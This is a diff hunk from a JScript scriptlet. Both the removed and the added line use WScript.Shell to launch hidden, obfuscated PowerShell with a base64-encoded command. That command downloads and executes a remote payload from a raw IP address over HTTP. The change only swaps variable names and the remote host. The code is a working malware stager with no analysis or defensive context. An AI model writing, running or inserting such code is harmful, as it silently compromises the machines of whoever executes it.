@@ -13,7 +13,7 @@
 <script language="JScript">
 <![CDATA[
 
-	var r = new ActiveXObject("WScript.Shell").Run("powershell /w 1 /C \"s\'\'v Qez -;s\'\'v LF e\'\'c;s\'\'v pp ((g\'\'v Qez).value.toString()+(g\'\'v LF).value.toString());powershell (g\'\'v pp).value.toString() (\'cABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAALQBuAG8AcAAgAC0AdwAgAGgAaQBkAGQAZQBuACAALQBjACAAIgBJAEUAWAAgACgAKABuAGUAdwAtAG8AYgBqAGUAYwB0ACAAbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAHMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADQANwAuADkAMQAuADEAOQA4AC4AMQA0ADkAOgAxADAAMgAzADAALwBpAG4AZABlAHgALgBoAHQAbQBsACcAKQApACIA\')\"", 0, true);
+	var r = new ActiveXObject("WScript.Shell").Run("powershell /w 1 /C \"s\'\'v mm -;s\'\'v Dp e\'\'c;s\'\'v DTs ((g\'\'v mm).value.toString()+(g\'\'v Dp).value.toString());powershell (g\'\'v DTs).value.toString() (\'cABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAALQBuAG8AcAAgAC0AdwAgAGgAaQBkAGQAZQBuACAALQBjACAAIgBJAEUAWAAgACgAKABuAGUAdwAtAG8AYgBqAGUAYwB0ACAAbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAHMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEANAAwAC4AOAAyAC4AMQA4AC4AMgAwADkAOgAxADEAMgA0ADAALwBpAG4AZABlAHgALgBoAHQAbQBsACcAKQApACIACgA\'+\'=\')\"", 0, true);
 
 ]]>
 </script>
